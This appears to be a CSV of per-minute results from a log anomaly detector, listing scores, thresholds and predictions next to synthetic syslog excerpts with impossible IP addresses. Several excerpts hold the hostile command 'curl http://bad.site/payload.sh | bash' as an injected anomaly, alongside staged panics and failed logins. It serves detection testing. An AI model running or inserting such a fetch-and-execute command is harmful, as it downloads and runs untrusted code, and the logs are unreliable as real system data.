bucket,early_warning_score,predict_raw,predict_confirmed,threshold,k_confirm,lines,example_text
2026-07-01 11:51:00,0.9994776998077428,0,0,0.9999894441123176,3,60,NetworkManager: Started Cleanup of Temporary Directories. || redis-server: Finished Daily apt download activities. || kernel: Started Cleanup of Temporary Directories. || unattended-upgrades: Started CUPS Scheduler. || systemd-timesyncd: Started Sess
2026-07-01 11:52:00,0.9997459542918226,0,0,0.9999894441123176,3,61,telnetd: Finished Daily apt download activities. || ntpd: Synced RTC time from system clock. || ftpd: Accepted publickey for user from 10.0.0.11 port 22 ssh2. || CRON: Accepted publickey for user from 10.0.0.180 port 22 ssh2. || cups: Listening on LV
2026-07-01 11:53:00,0.9976561254102038,0,0,0.9999894441123176,3,61,systemd-timesyncd: Listening on LVM2 poll daemon socket. || dockerd: Rotating log files. || NetworkManager: Started Session c192 of user root. || xinetd: Listening on LVM2 poll daemon socket. || ntpd: Finished Daily apt download activities. || sshd: 
2026-07-01 11:54:00,0.9907856584563348,0,0,0.9999894441123176,3,57,sshd: Accepted publickey for user from 10.0.0.34 port 22 ssh2. || sudo: Synced RTC time from system clock. || ftpd: kernel: Kernel panic - not syncing: Fatal exception || NetworkManager: Rotating log files. || kernel: Listening on LVM2 poll daemon so
2026-07-01 11:55:00,0.9989695667215333,0,0,0.9999894441123176,3,60,systemd: Started Cleanup of Temporary Directories. || docker: Synced RTC time from system clock. || systemd-timesyncd: Started CUPS Scheduler. || ufw: Rotating log files. || docker: Started Session c222 of user root. || logrotate: Started Cleanup of 
2026-07-01 11:56:00,0.9995106861903723,0,0,0.9999894441123176,3,60,kernel: [UFW BLOCK] IN=eth0 OUT= MAC= SRC=1.2.3.38902 DST=10.0.0.1 LEN=60 TOS=0x00 PREC=0x00 TTL=53 || ufw: Started Cleanup of Temporary Directories. || rsyslogd: Accepted publickey for user from 10.0.0.37 port 22 ssh2. || systemd: Started Cleanup of
2026-07-01 11:57:00,0.9999955925885924,1,0,0.9999894441123176,3,64,ftpd: Listening on LVM2 poll daemon socket. || ftpd: Finished Daily apt download activities. || ftpd: Finished Daily apt download activities. || rsyslogd: Started Session c75 of user root. || unix_chkpwd: EXT4-fs error (device sda1): ext4_find_entry:
2026-07-01 11:58:00,0.9989331297149515,0,0,0.9999894441123176,3,62,kernel: Rotating log files. || dockerd: Rotating log files. || xinetd: Synced RTC time from system clock. || unix_chkpwd: kernel: Out of memory: Kill process 11350 (python3) score 987 or sacrifice child || sudo: Finished Daily apt download activities
2026-07-01 11:59:00,0.9887366471184504,0,0,0.9999894441123176,3,57,dockerd: Accepted publickey for user from 10.0.0.194 port 22 ssh2. || NetworkManager: Synced RTC time from system clock. || redis-server: Started Session c190 of user root. || ftpd: Synced RTC time from system clock. || logrotate: Rotating log files.
2026-07-01 12:00:00,0.991845426320468,0,0,0.9999894441123176,3,59,smartd: Failed password for invalid user test from 192.168.1.34759 port 22 ssh2 || systemd-timesyncd: Accepted publickey for user from 10.0.0.78 port 22 ssh2. || kernel: Started CUPS Scheduler. || chronyd: Synced RTC time from system clock. || redis-
2026-07-01 12:01:00,0.9985742742631647,0,0,0.9999894441123176,3,62,systemd-timesyncd: bash: -c: line 1: curl http://bad.site/payload.sh | bash || ftpd: Synced RTC time from system clock. || chronyd: Synced RTC time from system clock. || unix_chkpwd: Started CUPS Scheduler. || sudo: Accepted publickey for user from 1
2026-07-01 12:02:00,0.9986862805488473,0,0,0.9999894441123176,3,66,CRON: Accepted publickey for user from 10.0.0.23 port 22 ssh2. || CRON: Synced RTC time from system clock. || kernel: Started Cleanup of Temporary Directories. || logrotate: Listening on LVM2 poll daemon socket. || systemd-timesyncd: Listening on LVM
2026-07-01 12:03:00,0.9997372660573332,0,0,0.9999894441123176,3,57,systemd: Synced RTC time from system clock. || systemd-timesyncd: Finished Daily apt download activities. || cups: Rotating log files. || ufw: Finished Daily apt download activities. || docker: Started Session c91 of user root. || cups: Started CUPS 
2026-07-01 12:04:00,0.9994629880609774,0,0,0.9999894441123176,3,62,systemd-timesyncd: Listening on LVM2 poll daemon socket. || dockerd: [UFW BLOCK] IN=eth0 OUT= MAC= SRC=1.2.3.39834 DST=10.0.0.1 LEN=60 TOS=0x00 PREC=0x00 TTL=53 || sshd: Accepted publickey for user from 10.0.0.230 port 22 ssh2. || systemd: Synced RTC
2026-07-01 12:05:00,0.9998410970289608,0,0,0.9999894441123176,3,60,redis-server: Started Session c198 of user root. || telnetd: Accepted publickey for user from 10.0.0.175 port 22 ssh2. || rsyslogd: Accepted publickey for user from 10.0.0.145 port 22 ssh2. || xinetd: bash: -c: line 1: curl http://bad.site/payload.sh
2026-07-01 12:06:00,0.9994400279399113,0,0,0.9999894441123176,3,59,gpm: Finished Daily apt download activities. || smartd: Rotating log files. || ftpd: EXT4-fs error (device sda1): ext4_find_entry:1455: inode #2: comm ls: reading directory lblock 0 || ftpd: Finished Daily apt download activities. || kernel: Rotating
2026-07-01 12:07:00,0.999662982888503,0,0,0.9999894441123176,3,61,cups: Synced RTC time from system clock. || docker: Accepted publickey for user from 10.0.0.94 port 22 ssh2. || dockerd: Accepted publickey for user from 10.0.0.119 port 22 ssh2. || NetworkManager: Finished Daily apt download activities. || sshd: Acc
2026-07-01 12:08:00,0.9989487541086599,0,0,0.9999894441123176,3,62,telnetd: Rotating log files. || rsyslogd: Started Session c140 of user root. || ftpd: Started Session c250 of user root. || chronyd: Accepted publickey for user from 10.0.0.116 port 22 ssh2. || docker: Started Session c5 of user root. || gpm: Synced 
2026-07-01 12:09:00,0.998885301922374,0,0,0.9999894441123176,3,60,CRON: Started CUPS Scheduler. || docker: Finished Daily apt download activities. || smartd: Finished Daily apt download activities. || chronyd: Accepted publickey for user from 10.0.0.115 port 22 ssh2. || unattended-upgrades: Synced RTC time from sys
2026-07-01 12:10:00,0.9998997725811823,0,0,0.9999894441123176,3,64,cups: Accepted publickey for user from 10.0.0.93 port 22 ssh2. || rsyslogd: Started CUPS Scheduler. || ftpd: Rotating log files. || telnetd: Rotating log files. || smartd: Synced RTC time from system clock. || unix_chkpwd: Accepted publickey for user
2026-07-01 12:11:00,0.9999303647566989,0,0,0.9999894441123176,3,61,smartd: Synced RTC time from system clock. || gpm: Started Cleanup of Temporary Directories. || rsyslogd: Started CUPS Scheduler. || chronyd: Accepted publickey for user from 10.0.0.89 port 22 ssh2. || sshd: Synced RTC time from system clock. || name
2026-07-01 12:12:00,0.9999819593505473,0,0,0.9999894441123176,3,61,unattended-upgrades: Started Session c1 of user root. || ftpd: Started Session c252 of user root. || redis-server: Started Cleanup of Temporary Directories. || ftpd: Synced RTC time from system clock. || xinetd: Started CUPS Scheduler. || cups: Start
2026-07-01 12:13:00,0.9999328938768444,0,0,0.9999894441123176,3,60,cups: Finished Daily apt download activities. || NetworkManager: Rotating log files. || NetworkManager: Started Session c140 of user root. || redis-server: Started Cleanup of Temporary Directories. || ntpd: Started Session c131 of user root. || xinet
2026-07-01 12:14:00,0.9998792986948476,0,0,0.9999894441123176,3,63,ufw: Listening on LVM2 poll daemon socket. || named: Started CUPS Scheduler. || ufw: Started Cleanup of Temporary Directories. || systemd-timesyncd: Finished Daily apt download activities. || logrotate: Synced RTC time from system clock. || xinetd: S
2026-07-01 12:15:00,0.9939472476515356,0,0,0.9999894441123176,3,63,cups: EXT4-fs error (device sda1): ext4_find_entry:1455: inode #2: comm ls: reading directory lblock 0 || rsyslogd: Synced RTC time from system clock. || telnetd: Synced RTC time from system clock. || logrotate: Started Session c177 of user root. || 
2026-07-01 12:16:00,0.996946396280311,0,0,0.9999894441123176,3,59,systemd-timesyncd: Synced RTC time from system clock. || unattended-upgrades: Synced RTC time from system clock. || ufw: Started CUPS Scheduler. || named: [UFW BLOCK] IN=eth0 OUT= MAC= SRC=1.2.3.40436 DST=10.0.0.1 LEN=60 TOS=0x00 PREC=0x00 TTL=53 || 
2026-07-01 12:17:00,0.9911220994492239,0,0,0.9999894441123176,3,59,ntpd: Rotating log files. || kernel: Rotating log files. || rsyslogd: Accepted publickey for user from 10.0.0.103 port 22 ssh2. || docker: Accepted publickey for user from 10.0.0.90 port 22 ssh2. || docker: Started Session c48 of user root. || unatte
2026-07-01 12:18:00,0.9998656706352,0,0,0.9999894441123176,3,62,ftpd: Finished Daily apt download activities. || unix_chkpwd: Started Session c135 of user root. || named: Accepted publickey for user from 10.0.0.40 port 22 ssh2. || ufw: Synced RTC time from system clock. || logrotate: Started CUPS Scheduler. || rs
2026-07-01 12:19:00,0.9995114518334084,0,0,0.9999894441123176,3,58,unix_chkpwd: Started CUPS Scheduler. || ufw: Synced RTC time from system clock. || gpm: Started CUPS Scheduler. || smartd: Listening on LVM2 poll daemon socket. || logrotate: Listening on LVM2 poll daemon socket. || telnetd: Rotating log files. || su
2026-07-01 12:20:00,0.9991844677088118,0,0,0.9999894441123176,3,61,cups: Started Cleanup of Temporary Directories. || logrotate: Rotating log files. || NetworkManager: Finished Daily apt download activities. || systemd-timesyncd: Listening on LVM2 poll daemon socket. || cups: Started Cleanup of Temporary Directories
2026-07-01 12:21:00,0.9980033108520199,0,0,0.9999894441123176,3,60,cups: Started CUPS Scheduler. || CRON: Started Cleanup of Temporary Directories. || named: Started Session c195 of user root. || cups: Finished Daily apt download activities. || chronyd: Started Session c32 of user root. || cups: [UFW BLOCK] IN=eth0 
2026-07-01 12:22:00,0.9995465523755996,0,0,0.9999894441123176,3,60,redis-server: Rotating log files. || systemd: EXT4-fs error (device sda1): ext4_find_entry:1455: inode #2: comm ls: reading directory lblock 0 || xinetd: Started Session c158 of user root. || rsyslogd: Started CUPS Scheduler. || CRON: Started Session
2026-07-01 12:23:00,0.999742678591747,0,0,0.9999894441123176,3,64,cups: Started Cleanup of Temporary Directories. || sudo: Started CUPS Scheduler. || logrotate: Synced RTC time from system clock. || chronyd: Accepted publickey for user from 10.0.0.162 port 22 ssh2. || systemd: Finished Daily apt download activities
2026-07-01 12:24:00,0.9998683462410679,0,0,0.9999894441123176,3,64,systemd-timesyncd: Started Session c46 of user root. || cups: Started Session c57 of user root. || sudo: Started CUPS Scheduler. || ufw: Started CUPS Scheduler. || redis-server: Rotating log files. || systemd-timesyncd: Listening on LVM2 poll daemon 
2026-07-01 12:25:00,0.9999221042242541,0,0,0.9999894441123176,3,60,chronyd: Rotating log files. || named: Accepted publickey for user from 10.0.0.66 port 22 ssh2. || gpm: Listening on LVM2 poll daemon socket. || NetworkManager: Synced RTC time from system clock. || unattended-upgrades: Started Session c161 of user r
2026-07-01 12:26:00,0.9998355480789917,0,0,0.9999894441123176,3,58,chronyd: Started Cleanup of Temporary Directories. || redis-server: Failed password for invalid user test from 192.168.1.56713 port 22 ssh2 || ftpd: Started CUPS Scheduler. || sudo: Accepted publickey for user from 10.0.0.184 port 22 ssh2. || logrota
2026-07-01 12:27:00,0.9998294125189969,0,0,0.9999894441123176,3,59,systemd: kernel: Kernel panic - not syncing: Fatal exception || telnetd: Rotating log files. || sshd: Started CUPS Scheduler. || xinetd: Listening on LVM2 poll daemon socket. || unattended-upgrades: Finished Daily apt download activities. || telnetd:
2026-07-01 12:28:00,0.9996904454091392,0,0,0.9999894441123176,3,60,ntpd: Started CUPS Scheduler. || xinetd: Started Session c64 of user root. || unattended-upgrades: Rotating log files. || redis-server: Listening on LVM2 poll daemon socket. || smartd: Rotating log files. || xinetd: bash: -c: line 1: curl http://bad.
2026-07-01 12:29:00,0.9985742452687514,0,0,0.9999894441123176,3,59,ntpd: Started Cleanup of Temporary Directories. || systemd: Started Cleanup of Temporary Directories. || gpm: Started Cleanup of Temporary Directories. || telnetd: Finished Daily apt download activities. || sudo: Started Session c158 of user root. ||
2026-07-01 12:30:00,0.9996712974495452,0,0,0.9999894441123176,3,59,named: Finished Daily apt download activities. || sshd: Finished Daily apt download activities. || gpm: Finished Daily apt download activities. || kernel: kernel: Out of memory: Kill process 2052 (python3) score 987 or sacrifice child || dockerd: ker
2026-07-01 12:31:00,0.9995916545889054,0,0,0.9999894441123176,3,59,logrotate: Started Session c116 of user root. || kernel: Started CUPS Scheduler. || dockerd: Started Session c197 of user root. || ntpd: Rotating log files. || xinetd: Synced RTC time from system clock. || dockerd: Started CUPS Scheduler. || telnetd:
2026-07-01 12:32:00,0.9999601544868741,0,0,0.9999894441123176,3,59,unattended-upgrades: Synced RTC time from system clock. || redis-server: Rotating log files. || docker: Listening on LVM2 poll daemon socket. || NetworkManager: Finished Daily apt download activities. || NetworkManager: Started Cleanup of Temporary D
2026-07-01 12:33:00,0.9997683766578155,0,0,0.9999894441123176,3,62,redis-server: Started Cleanup of Temporary Directories. || dockerd: Started CUPS Scheduler. || NetworkManager: Finished Daily apt download activities. || NetworkManager: Listening on LVM2 poll daemon socket. || docker: Synced RTC time from system clo
2026-07-01 12:34:00,0.9991201128083251,0,0,0.9999894441123176,3,57,CRON: EXT4-fs error (device sda1): ext4_find_entry:1455: inode #2: comm ls: reading directory lblock 0 || named: Accepted publickey for user from 10.0.0.141 port 22 ssh2. || redis-server: Accepted publickey for user from 10.0.0.123 port 22 ssh2. || r
2026-07-01 12:35:00,0.9996504360983934,0,0,0.9999894441123176,3,61,cups: Rotating log files. || ufw: Accepted publickey for user from 10.0.0.114 port 22 ssh2. || chronyd: Listening on LVM2 poll daemon socket. || docker: Listening on LVM2 poll daemon socket. || ntpd: Accepted publickey for user from 10.0.0.98 port 22
2026-07-01 12:36:00,0.9987010698154789,0,0,0.9999894441123176,3,60,telnetd: Listening on LVM2 poll daemon socket. || sshd: Accepted publickey for user from 10.0.0.61 port 22 ssh2. || rsyslogd: Started CUPS Scheduler. || telnetd: Started Session c254 of user root. || systemd-timesyncd: Started Cleanup of Temporary Di
2026-07-01 12:37:00,0.9987341812003455,0,0,0.9999894441123176,3,61,ufw: Rotating log files. || unix_chkpwd: Started CUPS Scheduler. || unattended-upgrades: Rotating log files. || systemd-timesyncd: Started Cleanup of Temporary Directories. || logrotate: Failed password for invalid user test from 192.168.1.15041 port
2026-07-01 12:38:00,0.9809470490325544,0,0,0.9999894441123176,3,60,gpm: Accepted publickey for user from 10.0.0.21 port 22 ssh2. || sudo: bash: -c: line 1: curl http://bad.site/payload.sh | bash || xinetd: Accepted publickey for user from 10.0.0.179 port 22 ssh2. || sudo: Finished Daily apt download activities. || s
2026-07-01 12:39:00,0.8705983414683587,0,0,0.9999894441123176,3,62,ntpd: Synced RTC time from system clock. || logrotate: Started Session c61 of user root. || ntpd: Started Cleanup of Temporary Directories. || CRON: Finished Daily apt download activities. || sudo: Rotating log files. || systemd-timesyncd: Started Cl
2026-07-01 12:40:00,0.8977529544507155,0,0,0.9999894441123176,3,59,named: Listening on LVM2 poll daemon socket. || docker: Started CUPS Scheduler. || redis-server: Accepted publickey for user from 10.0.0.144 port 22 ssh2. || CRON: Synced RTC time from system clock. || dockerd: Finished Daily apt download activities.
2026-07-01 12:41:00,0.9987558019682102,0,0,0.9999894441123176,3,62,cups: Started Session c89 of user root. || redis-server: Started Cleanup of Temporary Directories. || docker: Started Session c173 of user root. || systemd: Started Cleanup of Temporary Directories. || CRON: Rotating log files. || smartd: kernel: Ker
2026-07-01 12:42:00,0.9969136123383981,0,0,0.9999894441123176,3,62,ufw: Started Session c166 of user root. || gpm: app[1234]: segfault at 0 ip 00007f stackpointer error 4 in lib.so[7f000] (core dumped) || unix_chkpwd: bash: -c: line 1: curl http://bad.site/payload.sh | bash || logrotate: Finished Daily apt download 
2026-07-01 12:43:00,0.9908808858031649,0,0,0.9999894441123176,3,59,sudo: Synced RTC time from system clock. || logrotate: bash: -c: line 1: curl http://bad.site/payload.sh | bash || systemd: Listening on LVM2 poll daemon socket. || rsyslogd: Started CUPS Scheduler. || named: Rotating log files. || systemd: Listening
2026-07-01 12:44:00,0.9631720387161864,0,0,0.9999894441123176,3,59,NetworkManager: Listening on LVM2 poll daemon socket. || ufw: Started Session c245 of user root. || smartd: Accepted publickey for user from 10.0.0.53 port 22 ssh2. || sshd: EXT4-fs error (device sda1): ext4_find_entry:1455: inode #2: comm ls: readin
2026-07-01 12:45:00,0.9955556299830618,0,0,0.9999894441123176,3,60,NetworkManager: Started Cleanup of Temporary Directories. || docker: Accepted publickey for user from 10.0.0.61 port 22 ssh2. || redis-server: Synced RTC time from system clock. || kernel: Accepted publickey for user from 10.0.0.30 port 22 ssh2. || u
2026-07-01 12:46:00,0.9994696202852402,0,0,0.9999894441123176,3,59,logrotate: Synced RTC time from system clock. || kernel: Accepted publickey for user from 10.0.0.177 port 22 ssh2. || docker: Started Cleanup of Temporary Directories. || unattended-upgrades: Started Session c48 of user root. || ntpd: Started CUPS Sc
2026-07-01 12:47:00,0.9997353080051646,0,0,0.9999894441123176,3,62,smartd: app[1234]: segfault at 0 ip 00007f stackpointer error 4 in lib.so[7f000] (core dumped) || unattended-upgrades: Listening on LVM2 poll daemon socket. || gpm: Synced RTC time from system clock. || systemd: Started Cleanup of Temporary Directori
2026-07-01 12:48:00,0.9998327565438507,0,0,0.9999894441123176,3,60,chronyd: Started Session c209 of user root. || ufw: Failed password for invalid user test from 192.168.1.27299 port 22 ssh2 || named: Started Cleanup of Temporary Directories. || rsyslogd: Rotating log files. || logrotate: Accepted publickey for user
2026-07-01 12:49:00,0.9989194571057419,0,0,0.9999894441123176,3,57,systemd-timesyncd: Started Session c6 of user root. || sshd: Finished Daily apt download activities. || telnetd: Started CUPS Scheduler. || smartd: Rotating log files. || systemd-timesyncd: Finished Daily apt download activities. || unix_chkpwd: Star
2026-07-01 12:50:00,0.9994599276593192,0,0,0.9999894441123176,3,60,xinetd: Rotating log files. || gpm: Started Cleanup of Temporary Directories. || docker: Finished Daily apt download activities. || rsyslogd: Finished Daily apt download activities. || redis-server: Started Session c27 of user root. || logrotate: Sta
2026-07-01 12:51:00,0.999081831629349,0,0,0.9999894441123176,3,60,kernel: Started Session c230 of user root. || docker: Accepted publickey for user from 10.0.0.49 port 22 ssh2. || telnetd: Accepted publickey for user from 10.0.0.136 port 22 ssh2. || docker: Rotating log files. || named: Synced RTC time from system 
2026-07-01 12:52:00,0.9998924934846106,0,0,0.9999894441123176,3,60,systemd-timesyncd: [UFW BLOCK] IN=eth0 OUT= MAC= SRC=1.2.3.17387 DST=10.0.0.1 LEN=60 TOS=0x00 PREC=0x00 TTL=53 || kernel: Rotating log files. || xinetd: Synced RTC time from system clock. || ntpd: Accepted publickey for user from 10.0.0.49 port 22 ss
2026-07-01 12:53:00,0.9999438154047757,0,0,0.9999894441123176,3,61,redis-server: Started Session c159 of user root. || redis-server: Started Cleanup of Temporary Directories. || logrotate: Listening on LVM2 poll daemon socket. || ftpd: Started CUPS Scheduler. || sshd: Started CUPS Scheduler. || sudo: Listening on LV
2026-07-01 12:54:00,0.9972257405374818,0,0,0.9999894441123176,3,63,kernel: app[1234]: segfault at 0 ip 00007f stackpointer error 4 in lib.so[7f000] (core dumped) || gpm: Started Session c140 of user root. || xinetd: Started Session c226 of user root. || unix_chkpwd: Listening on LVM2 poll daemon socket. || cups: Rot
2026-07-01 12:55:00,0.9914860973424953,0,0,0.9999894441123176,3,63,smartd: Synced RTC time from system clock. || docker: Synced RTC time from system clock. || telnetd: Started Cleanup of Temporary Directories. || cups: Accepted publickey for user from 10.0.0.243 port 22 ssh2. || ftpd: Finished Daily apt download act
2026-07-01 12:56:00,0.9927432390123769,0,0,0.9999894441123176,3,59,named: Listening on LVM2 poll daemon socket. || smartd: Started CUPS Scheduler. || gpm: Started Cleanup of Temporary Directories. || unattended-upgrades: Rotating log files. || cups: Listening on LVM2 poll daemon socket. || cups: Synced RTC time from
2026-07-01 12:57:00,0.9801810256855824,0,0,0.9999894441123176,3,61,ufw: Started CUPS Scheduler. || named: Started Session c246 of user root. || ufw: Rotating log files. || NetworkManager: Rotating log files. || sudo: Finished Daily apt download activities. || ntpd: Started CUPS Scheduler. || ntpd: Accepted publickey
2026-07-01 12:58:00,0.9048630555038187,0,0,0.9999894441123176,3,61,ntpd: Started Session c47 of user root. || sshd: Rotating log files. || xinetd: Started Session c187 of user root. || sshd: Started Session c240 of user root. || xinetd: Rotating log files. || systemd-timesyncd: Rotating log files. || logrotate: Sync
2026-07-01 12:59:00,0.8414588131119649,0,0,0.9999894441123176,3,56,unix_chkpwd: Listening on LVM2 poll daemon socket. || rsyslogd: Started Session c53 of user root. || gpm: Finished Daily apt download activities. || unix_chkpwd: Accepted publickey for user from 10.0.0.211 port 22 ssh2. || named: Accepted publickey f
2026-07-01 13:00:00,0.9915863293721289,0,0,0.9999894441123176,3,63,telnetd: Accepted publickey for user from 10.0.0.91 port 22 ssh2. || cups: Finished Daily apt download activities. || systemd-timesyncd: Listening on LVM2 poll daemon socket. || redis-server: Finished Daily apt download activities. || systemd: Starte
2026-07-01 13:01:00,0.9786586383368778,0,0,0.9999894441123176,3,61,NetworkManager: app[1234]: segfault at 0 ip 00007f stackpointer error 4 in lib.so[7f000] (core dumped) || CRON: Listening on LVM2 poll daemon socket. || logrotate: Finished Daily apt download activities. || kernel: Started CUPS Scheduler. || NetworkM
2026-07-01 13:02:00,0.8923580187450602,0,0,0.9999894441123176,3,57,rsyslogd: Started CUPS Scheduler. || unattended-upgrades: Accepted publickey for user from 10.0.0.23 port 22 ssh2. || systemd-timesyncd: Started CUPS Scheduler. || docker: Rotating log files. || cups: Started Session c227 of user root. || xinetd: Sta
2026-07-01 13:03:00,0.9925454316424731,0,0,0.9999894441123176,3,56,ufw: Rotating log files. || sshd: Started CUPS Scheduler. || cups: [UFW BLOCK] IN=eth0 OUT= MAC= SRC=1.2.3.61764 DST=10.0.0.1 LEN=60 TOS=0x00 PREC=0x00 TTL=53 || logrotate: Finished Daily apt download activities. || redis-server: Started Cleanup of T
2026-07-01 13:04:00,0.9979251034855251,0,0,0.9999894441123176,3,60,xinetd: Synced RTC time from system clock. || systemd-timesyncd: Started Session c227 of user root. || CRON: Started CUPS Scheduler. || systemd: Rotating log files. || sshd: Started Cleanup of Temporary Directories. || CRON: Started Session c77 of us
2026-07-01 13:05:00,0.9905751887371076,0,0,0.9999894441123176,3,60,ftpd: Started Cleanup of Temporary Directories. || smartd: Finished Daily apt download activities. || ntpd: Accepted publickey for user from 10.0.0.162 port 22 ssh2. || CRON: Finished Daily apt download activities. || cups: Listening on LVM2 poll dae
2026-07-01 13:06:00,0.997820260282824,0,0,0.9999894441123176,3,60,cups: Started Cleanup of Temporary Directories. || dockerd: Rotating log files. || dockerd: Synced RTC time from system clock. || dockerd: Started Cleanup of Temporary Directories. || named: Synced RTC time from system clock. || docker: Started Sessi
2026-07-01 13:07:00,0.9992481701500916,0,0,0.9999894441123176,3,67,unattended-upgrades: Listening on LVM2 poll daemon socket. || CRON: Started CUPS Scheduler. || named: Finished Daily apt download activities. || ufw: Listening on LVM2 poll daemon socket. || systemd: Synced RTC time from system clock. || NetworkManag
2026-07-01 13:08:00,0.9999198896455852,0,0,0.9999894441123176,3,61,gpm: Started Session c67 of user root. || docker: Finished Daily apt download activities. || smartd: Started CUPS Scheduler. || smartd: Finished Daily apt download activities. || CRON: Started CUPS Scheduler. || unix_chkpwd: Started Session c175 of u
2026-07-01 13:09:00,0.9994140333681667,0,0,0.9999894441123176,3,60,sudo: Started CUPS Scheduler. || smartd: Started CUPS Scheduler. || sshd: Started Cleanup of Temporary Directories. || docker: Finished Daily apt download activities. || ftpd: Started Session c222 of user root. || unattended-upgrades: Started Session
2026-07-01 13:10:00,0.9994360656493004,0,0,0.9999894441123176,3,61,kernel: Synced RTC time from system clock. || ntpd: Rotating log files. || unix_chkpwd: Synced RTC time from system clock. || smartd: Listening on LVM2 poll daemon socket. || chronyd: Synced RTC time from system clock. || ufw: Started CUPS Scheduler.
2026-07-01 13:11:00,0.9980981542662629,0,0,0.9999894441123176,3,62,chronyd: Started Cleanup of Temporary Directories. || docker: Listening on LVM2 poll daemon socket. || ftpd: Rotating log files. || systemd: Rotating log files. || chronyd: Rotating log files. || NetworkManager: Rotating log files. || NetworkManager:
2026-07-01 13:12:00,0.9901077058488755,0,0,0.9999894441123176,3,60,named: Started CUPS Scheduler. || xinetd: Rotating log files. || dockerd: Started Session c126 of user root. || systemd-timesyncd: Started Session c119 of user root. || xinetd: Started CUPS Scheduler. || ftpd: Started Session c199 of user root. || na
2026-07-01 13:13:00,0.9898817946510516,0,0,0.9999894441123176,3,63,CRON: bash: -c: line 1: curl http://bad.site/payload.sh | bash || kernel: Started Cleanup of Temporary Directories. || telnetd: Synced RTC time from system clock. || rsyslogd: Started Cleanup of Temporary Directories. || ufw: Listening on LVM2 poll d
2026-07-01 13:14:00,0.9984977270033377,0,0,0.9999894441123176,3,63,rsyslogd: Finished Daily apt download activities. || unix_chkpwd: Finished Daily apt download activities. || CRON: Finished Daily apt download activities. || sshd: Accepted publickey for user from 10.0.0.212 port 22 ssh2. || dockerd: Synced RTC time 
2026-07-01 13:15:00,0.9998829417851006,0,0,0.9999894441123176,3,60,gpm: Finished Daily apt download activities. || sshd: Started Cleanup of Temporary Directories. || unattended-upgrades: [UFW BLOCK] IN=eth0 OUT= MAC= SRC=1.2.3.17541 DST=10.0.0.1 LEN=60 TOS=0x00 PREC=0x00 TTL=53 || unattended-upgrades: Started CUPS S
2026-07-01 13:16:00,0.999916677671323,0,0,0.9999894441123176,3,59,unix_chkpwd: Finished Daily apt download activities. || rsyslogd: Accepted publickey for user from 10.0.0.132 port 22 ssh2. || chronyd: Started Cleanup of Temporary Directories. || telnetd: Started Cleanup of Temporary Directories. || unix_chkpwd: Fi
2026-07-01 13:17:00,0.9995287647297776,0,0,0.9999894441123176,3,58,named: Started CUPS Scheduler. || kernel: Started CUPS Scheduler. || sudo: Rotating log files. || ufw: kernel: Out of memory: Kill process 20380 (python3) score 987 or sacrifice child || xinetd: Listening on LVM2 poll daemon socket. || CRON: Started 
2026-07-01 13:18:00,0.9995274846861953,0,0,0.9999894441123176,3,62,systemd: Synced RTC time from system clock. || sudo: Finished Daily apt download activities. || chronyd: Started Session c4 of user root. || docker: Rotating log files. || dockerd: Started Cleanup of Temporary Directories. || cups: Started CUPS Sched
2026-07-01 13:19:00,0.9996485100011779,0,0,0.9999894441123176,3,59,xinetd: Synced RTC time from system clock. || named: Synced RTC time from system clock. || unattended-upgrades: Started CUPS Scheduler. || ufw: Listening on LVM2 poll daemon socket. || sshd: Listening on LVM2 poll daemon socket. || ufw: Synced RTC ti
2026-07-01 13:20:00,0.9997950713799425,0,0,0.9999894441123176,3,59,docker: Listening on LVM2 poll daemon socket. || rsyslogd: Listening on LVM2 poll daemon socket. || unix_chkpwd: Synced RTC time from system clock. || chronyd: Listening on LVM2 poll daemon socket. || logrotate: Started Session c227 of user root. || 
2026-07-01 13:21:00,0.9975779915801802,0,0,0.9999894441123176,3,64,dockerd: Rotating log files. || sshd: Started CUPS Scheduler. || docker: Started CUPS Scheduler. || systemd: Listening on LVM2 poll daemon socket. || redis-server: Listening on LVM2 poll daemon socket. || telnetd: Finished Daily apt download activiti
2026-07-01 13:22:00,0.9992354321305392,0,0,0.9999894441123176,3,57,systemd-timesyncd: Rotating log files. || sudo: Accepted publickey for user from 10.0.0.139 port 22 ssh2. || xinetd: Rotating log files. || chronyd: Synced RTC time from system clock. || smartd: Started Cleanup of Temporary Directories. || ntpd: Acce
2026-07-01 13:23:00,0.9988467917508669,0,0,0.9999894441123176,3,61,dockerd: Rotating log files. || unix_chkpwd: Started CUPS Scheduler. || dockerd: Started CUPS Scheduler. || rsyslogd: Started Session c247 of user root. || telnetd: Rotating log files. || rsyslogd: Finished Daily apt download activities. || chronyd: 
